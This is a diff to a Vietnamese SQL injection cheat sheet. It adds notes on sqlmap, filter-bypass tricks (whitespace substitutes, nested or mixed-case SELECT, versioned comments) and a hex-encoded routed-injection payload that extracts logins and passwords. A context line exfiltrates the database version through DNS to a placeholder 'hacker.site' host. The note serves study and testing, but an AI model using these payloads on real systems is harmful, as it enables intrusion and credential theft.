@@ -129,8 +129,26 @@ Trường hợp này không thể nhìn thấy kết quả truy vấn lỗi như
  select load_file(concat('\\\\',version(),'.hacker.site\\a.txt'));
  ```
  
- 
+### Khai thác tự động
+Sử dụng sqlmap, sử dụng các wordlists về payload để brute-force...
+### Thêm ...
+#### filter spaces
+Sử dụng  %0a, %0b, %0c, %0d, %09, %a0 để thay thế space ` `.
+#### filter SELECT...
+Trong trường hợp bị thay thế SELECT với null, có thể dùng từ lồng nhau như `SESELECTLECT` ...
+#### case matching
+Trong SQL không phân biệt chữ hoa thường có thể dùng sEleCT để `bypass`
+#### regular matching
+Khi filter regex `\bselect\b` có thể dùng `/*!50000select*/`
+#### replaced single or double quotation marks, forgot the backslash
+#### Routed SQL injection
+Là trường hợp trong truy vấn có thể không phải là truy vấn đầu vào.
+```
+#Hex of: -1' union select login,password from users-- 
+-1' union select 0x2d312720756e696f6e2073656c656374206c6f67696e2c70617373776f72642066726f6d2075736572732d2d2061 -- 
+```
 
+ 
  
  
  
